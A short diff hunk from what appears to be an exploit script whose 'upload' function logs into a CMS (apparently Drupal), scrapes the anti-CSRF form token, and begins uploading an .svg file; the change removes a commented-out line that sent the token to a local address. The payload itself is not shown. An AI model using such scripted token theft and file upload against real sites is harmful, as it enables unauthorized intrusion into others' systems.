@@ -192,7 +192,7 @@ def upload(host, WebRoot, username, password, exploit):
     print("\n[+] Extracting the Anti-CSRF Token ...")
     response = session.get(targetUrl+"/node/add/article").text
     token = BeautifulSoup(response, 'html.parser').find('input', {'name':'form_token'})['value']
-    #session.get("http://127.0.0.1:8000/?miao="+token)
+    
 
     #Uploading the .svg file
     file = {
